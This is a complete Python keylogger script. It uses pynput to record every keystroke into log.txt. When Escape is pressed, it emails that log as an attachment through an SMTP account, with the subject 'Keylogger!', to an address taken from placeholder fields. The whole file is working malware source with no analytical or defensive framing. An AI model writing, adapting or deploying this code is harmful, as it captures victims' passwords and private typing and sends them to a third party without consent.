import smtplib
from os.path import basename
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(
    format='%(asctime)s %(levelname)-8s %(message)s',
    level=logging.INFO,
    datefmt='%Y-%m-%d %H:%M:%S')

keys = []

def on_press(key):
    try:
        logging.info('Key %s pressed.', key.char)
        keys.append(key.char)
    except AttributeError:
        logging.info('Special key %s pressed.', key)
        keys.append(key)

def write_log(keys):
    with open("log.txt", "a") as f:
        words = []
        for key in keys:
            if str(key).startswith("Key"):
                if str(key) == "Key.space":
                    words.append(" [key.space] ")
                continue
            words.append(str(key).replace("'", ""))
        if len(words) > 0:
            f.write("".join(words) + "\n")

def on_release(key):
    if key == Key.esc:
        logging.info('Logging stopped.')
        write_log(keys)
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    logging.info('Logging started.')
    l.join()


def send_mail():
    # Fill in your email details below:
    from_addr = 'your_email@example.com'  # Sender's email address
    to_addr = 'recipient_email@example.com'  # Recipient's email address
    email_password = 'your_email_password'  # Sender's email password
    smtp_server = 'smtp.example.com'  # SMTP server address
    smtp_port = 587  # SMTP port number

    subject = 'Keylogger!'
    content = 'Captured Keystrokes'

    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    body = MIMEText(content, 'plain')
    msg.attach(body)

    filename = 'log.txt'
    with open(filename, 'r') as f:
        part = MIMEApplication(f.read(), Name=basename(filename))
        part['Content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
    msg.attach(part)

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(from_addr, email_password)
    server.send_message(msg)
    server.quit()

send_mail()
